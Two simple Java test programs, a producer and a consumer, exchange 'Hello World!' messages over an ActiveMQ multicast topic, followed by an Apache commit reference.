::::::::::::::::::::::::::::::::::::
    Producer tester
::::::::::::::::::::::::::::::::::::

import java.util.Properties;

import javax.jms.Connection;
import javax.jms.ConnectionFactory;
import javax.jms.Destination;
import javax.jms.Message;
import javax.jms.MessageProducer;
import javax.jms.Session;
import javax.naming.Context;
import javax.naming.InitialContext;
import javax.naming.Reference;

import org.codehaus.activemq.ActiveMQConnectionFactory;
import org.codehaus.activemq.jndi.JNDIReferenceFactory;


/**
 * Class to test ActiveMQ Publisher
 *
 * @author $author$
 * @version $Revision$
 */
public class TestActiveMQProducer
{
    protected ConnectionFactory connFactory;
    protected Connection sndConn;
    protected Session sndSess;
    protected MessageProducer producer;
    protected Destination dest;

    /**
     * main logic
     *
     * @param args .
     *
     * @throws Exception !
     */
    public static void main(String[] args) throws Exception
    {
        TestActiveMQProducer tester = new TestActiveMQProducer();

        tester.setUp();

        for (int i = 0; i < 100; i++) {
            Message msg = tester.sndSess.createTextMessage(""Hello World!"");
            tester.producer.send(tester.dest, msg);
            System.out.println(""Sent msg: "" + msg);
            Thread.sleep(1000);
        }
        
        tester.tearDown();
    }

    protected void setUp() throws Exception
    {
        connFactory = new ActiveMQConnectionFactory(""multicast://224.0.0.1:8000"");     
        //connFactory = new ActiveMQConnectionFactory(""tcp://127.0.0.1:61616"");       
        System.out.println(""Created conn factory: "" + connFactory);
        
        sndConn = connFactory.createConnection();
        System.out.println(""Created conn: "" + sndConn);
        
        sndSess = sndConn.createSession(false, Session.AUTO_ACKNOWLEDGE);
        System.out.println(""Created receiveSession: "" + sndSess);
        
        dest = sndSess.createTopic(""FOO"");
        System.out.println( ""Created destination: "" + dest + "" of type: "" + dest.getClass() );

        producer = sndSess.createProducer(dest);
        sndConn.start();
        
        System.out.println(""Started connections"");
    }

    protected void tearDown() throws Exception
    {
        sndSess.close();
        sndConn.close();
    }
}


::::::::::::::::::::::::::::::::::::
    Consumer tester
::::::::::::::::::::::::::::::::::::

import java.util.Properties;

import javax.jms.Connection;
import javax.jms.ConnectionFactory;
import javax.jms.Destination;
import javax.jms.Message;
import javax.jms.MessageConsumer;
import javax.jms.MessageListener;
import javax.jms.Session;
import javax.naming.Context;
import javax.naming.InitialContext;
import javax.naming.Reference;

import org.codehaus.activemq.ActiveMQConnectionFactory;
import org.codehaus.activemq.jndi.JNDIReferenceFactory;


/**
 * Class to test ActiveMQ Subscriber
 *
 * @author $author$
 * @version $Revision$
 */
public class TestActiveMQConsumer implements MessageListener
{
    protected ConnectionFactory connFactory;
    protected Connection rcvConn;
    protected Session rcvSess;
    protected MessageConsumer consumer;
    protected Destination dest;

    /**
     * main logic
     *
     * @param args .
     *
     * @throws Exception !
     */
    public static void main(String[] args) throws Exception
    {
        TestActiveMQConsumer tester = new TestActiveMQConsumer();

        tester.setUp();

        // tester.tearDown();
    }

    protected void setUp() throws Exception
    {
        connFactory = new ActiveMQConnectionFactory(""multicast://224.0.0.1:8000"");     
        //connFactory = new ActiveMQConnectionFactory(""tcp://127.0.0.1:61616"");     
        System.out.println(""Created conn factory: "" + connFactory);
   
        rcvConn = connFactory.createConnection();
        System.out.println(""Created conn: "" + rcvConn);
        
        rcvSess = rcvConn.createSession(false, Session.AUTO_ACKNOWLEDGE);
        System.out.println(""Created receiveSession: "" + rcvSess);
        
        dest = rcvSess.createTopic(""FOO"");
        System.out.println( ""Created destination: "" + dest + "" of type: "" + dest.getClass() );
            
        consumer = rcvSess.createConsumer(dest);
        consumer.setMessageListener(this);
        rcvConn.start();
        
        System.out.println(""Started connections"");
    }

    protected void tearDown() throws Exception
    {
        rcvSess.close();
        rcvConn.close();
    }

    /**
     * Got a message!
     *
     * @param message .
     */
    public void onMessage(Message message)
    {
        System.out.println(""Received message: "" + message);
    }
}",b895efce021677322165835b3f509b44c317a0ed,"Revert part of the fix for https://issues.apache.org/jira/browse/AMQ-2922 that removed the xbean element annotation.

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1148072 13f79535-47bb-0310-9956-ffa450edef68"
